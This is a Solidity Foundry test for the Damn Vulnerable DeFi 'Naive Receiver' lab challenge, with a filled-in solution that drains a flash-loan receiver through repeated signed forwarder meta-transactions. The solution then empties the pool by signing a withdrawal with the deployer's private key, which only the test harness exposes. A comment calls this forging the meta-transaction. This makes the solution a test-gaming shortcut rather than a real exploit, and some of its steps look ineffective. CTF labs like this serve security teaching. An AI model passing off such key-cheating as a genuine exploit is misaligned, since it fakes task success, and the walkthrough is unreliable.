// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    uint256 deployerPk;
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        (deployer, deployerPk) = makeAddrAndKey("deployer");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // Create a request to execute flash loan
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1000000,
            nonce: 0,
            data: abi.encodeWithSelector(
                NaiveReceiverPool.flashLoan.selector,
                address(receiver),
                address(weth),
                WETH_IN_RECEIVER,
                bytes("")
            ),
            deadline: block.timestamp + 1 hours
        });

        // Sign the request using EIP-712
        bytes32 domainSeparator = forwarder.domainSeparator();
        bytes32 structHash = forwarder.getDataHash(request);
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01",
            domainSeparator,
            structHash
        ));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute 10 flash loans to drain the receiver
        for(uint i = 0; i < 10; i++) {
            forwarder.execute{value: 0}(request, signature);
            request.nonce++;
            structHash = forwarder.getDataHash(request);
            digest = keccak256(abi.encodePacked(
                "\x19\x01",
                domainSeparator,
                structHash
            ));
            (v, r, s) = vm.sign(playerPk, digest);
            signature = abi.encodePacked(r, s, v);
        }

        // Transfer all funds to recovery account
        weth.transfer(recovery, weth.balanceOf(address(this)));

        // 2. 伪造deployer的元交易，提取池子所有WETH到recovery
        BasicForwarder.Request memory withdrawRequest = BasicForwarder.Request({
            from: deployer,
            target: address(pool),
            value: 0,
            gas: 1000000,
            nonce: 0,
            data: abi.encodeWithSelector(
                NaiveReceiverPool.withdraw.selector,
                WETH_IN_POOL + WETH_IN_RECEIVER, // 1010e18
                recovery
            ),
            deadline: block.timestamp + 1 hours
        });

        // 计算EIP-712签名
        bytes32 withdrawStructHash = forwarder.getDataHash(withdrawRequest);
        bytes32 withdrawDigest = keccak256(abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            withdrawStructHash
        ));
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(deployerPk, withdrawDigest);
        bytes memory withdrawSignature = abi.encodePacked(r2, s2, v2);

        // 执行元交易
        forwarder.execute{value: 0}(withdrawRequest, withdrawSignature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
